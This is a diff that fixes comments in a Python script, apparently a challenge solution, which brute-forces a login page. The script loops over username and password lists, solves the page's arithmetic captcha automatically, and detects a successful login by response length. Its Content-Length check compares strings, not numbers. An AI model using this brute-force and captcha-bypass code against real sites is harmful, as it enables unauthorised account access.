@@ -12,11 +12,12 @@ Pass=[]
 User=[]
 print("Starting the login session ...")
 
-#Loop throught usernames and password options
+#Loop through usernames and password options
 for u_element in usernames:
     for p_element in passwords:
 
-    #setBrowser: Combinate Mechanize with BeautifulSoup,this way i can acess elements without page refresh(url reopen)
+    #setBrowser: Combinate Mechanize with BeautifulSoup,
+    #this way I can access elements without a page refresh(URL reopen)
         br = mechanize.Browser()
         a=br.open("https://afeladat2017.whiteshield.net/login")
         br.select_form(nr=0)
@@ -29,7 +30,7 @@ for u_element in usernames:
         captcha= form.find("span", id="math").text # captcha example( 4 * 9 = )
         math=captcha.replace('=', '') #math example(4 * 9 )
 
-    #Get Captcha tags: Using operator Module to calculate the validation
+    #Get Captcha tags: Using the operator Module to calculate the validation
         ops = {
             "+": operator.add,
             "-": operator.sub,
@@ -50,7 +51,7 @@ for u_element in usernames:
         str_operator = str(operators)
         
     #Login:
-        br.select_form(action='/login') #select form, i could use here nr=0 too
+        br.select_form(action='/login') #select form, I could use here nr=0 too
         User.append(u_element)  #save the current username
         Pass.append(p_element)  #save the current password
 
@@ -58,7 +59,8 @@ for u_element in usernames:
         br.form['username'] = u_element 
         br.form['password'] =  p_element
         br.form['captcha_1'] = str_operator
-        All.append([u_element,p_element,first_math,web_operators,second_math,operators]) #Save filled the datas
+     #Save filled the data
+        All.append([u_element,p_element,first_math,web_operators,second_math,operators])
         
     #Submit the form, Give a response to the user
         print("\n")
@@ -67,7 +69,7 @@ for u_element in usernames:
         print(f"Captcha: {All[-1][2]} {All[-1][3]} {All[-1][4]} = {All[-1][5]} ")
         response=br.submit()
 
-    #I used here ._headers["Content-Length"] because there was a difference between correct and uncorect login
+    #I used here ._headers["Content-Length"] because there was a difference between correct and incorect login
         if(response._headers["Content-Length"] < "2000"):
             print("")
             print("Sucess!")
